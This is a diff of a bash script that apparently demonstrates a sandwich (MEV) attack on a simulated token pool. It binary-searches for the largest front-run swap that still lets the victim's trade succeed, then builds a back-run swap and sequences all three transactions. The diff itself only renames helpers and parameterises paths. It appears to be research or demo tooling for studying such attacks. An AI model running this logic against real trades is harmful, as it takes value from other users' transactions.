@@ -1,20 +1,19 @@
 #!/bin/bash
 set -e
 
-source ./scripts/demo_utils.sh
+source ./scripts/mev_utils.sh
 
-CONTRACT_ADDRESS=`cat contractAddress.txt`
-CODE_HASH=`cat codeHash.txt`
+CONTRACT_ADDRESS=`cat $CONTRACT_LOC/contractAddress.txt`
+CODE_HASH=`cat $CONTRACT_LOC/codeHash.txt`
 
-snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')
-set_snapshot "${snapshot_uniq_label}-start"
+set_snapshot "${UNIQUE_LABEL}-start"
 
 query_balances
 echo "pool_a $(query_pool pool_a)"
 echo "pool_a $(query_pool pool_b)"
 
 # make victim tx
-generate_and_sign_tx token_a 10 20 $VICTIM victim
+generate_and_sign_swap token_a 10 20 $VICTIM victim
 echo "victim tx token_a 10 20"
 echo
 
@@ -22,12 +21,12 @@ cnt=0
 lo=0
 hi=100
 while [ $(expr $hi - $lo) -ne 1 ]; do
-  set_snapshot "${snapshot_uniq_label}-${cnt}"
+  set_snapshot "${UNIQUE_LABEL}-${cnt}"
 
   mid=$((($hi + $lo) / 2))
   echo "lo:$lo hi:$hi mid:$mid"
 
-  generate_and_sign_tx token_a $mid 0 $ADV adv
+  generate_and_sign_swap token_a $mid 0 $ADV adv
   echo "adv tx token_a $mid 0"
 
   simulate_tx adv
@@ -43,18 +42,18 @@ while [ $(expr $hi - $lo) -ne 1 ]; do
   echo
 done
 
-set_snapshot "${snapshot_uniq_label}-${cnt}"
+set_snapshot "${UNIQUE_LABEL}-${cnt}"
 echo "final front-run tx token_a $lo 0"
 old_pool_b=$(query_pool pool_b)
 simulate_tx adv
 new_pool_b=$(query_pool pool_b)
 dif_pool_b=$(($old_pool_b - $new_pool_b))
-generate_and_sign_tx token_b $dif_pool_b 0 $ADV adv_back
+generate_and_sign_swap token_b $dif_pool_b 0 $ADV adv_back
 echo "final back-run tx token_b $dif_pool_b 0"
 
 echo
 # broadcast all 3 txs
-set_snapshot "${snapshot_uniq_label}-final"
+set_snapshot "${UNIQUE_LABEL}-final"
 simulate_tx adv
 simulate_tx victim
 simulate_tx adv_back
